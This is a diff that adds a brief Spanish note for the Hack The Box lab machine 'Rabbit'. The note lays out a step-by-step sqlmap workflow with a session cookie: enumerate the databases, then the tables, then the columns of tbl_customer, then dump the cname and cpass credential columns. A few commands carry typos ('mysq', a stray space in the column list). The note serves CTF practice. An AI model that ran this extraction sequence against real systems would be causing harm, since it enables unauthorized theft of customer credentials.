@@ -1,0 +1,20 @@
+Con la maquina rabbit en HTB
+
+Comando para sqlmap:
+'''
+> sqlmap -u <url> --cookie=<cookie> --dbs --batch --random-agent --dbms=mysql
+'''
+
+cuando ya se sabe cual es la base de datos en la que queriemos trabajar hacemos lo siguiente:
+'''
+> sqlmap -u <url> --cookie=<cookie> -D <db name> --tables --batch --random-agent --dbms=mysql
+'''
+
+ya cuando tiene la tablas, seria lo siguiente:
+'''
+> sqlmap -u <url> --cookie=<cookie> -D <db name> -T tbl_customer --columns --batch --random-agent --dbms=mysq
+'''
+para dumpiar las colunas:
+'''
+> sqlmap -u <url> --cookie=<cookie> -D <db name> -T tbl_customer -C cname, cpass --dump --batch --random-agent --dbms=mysq
+'''
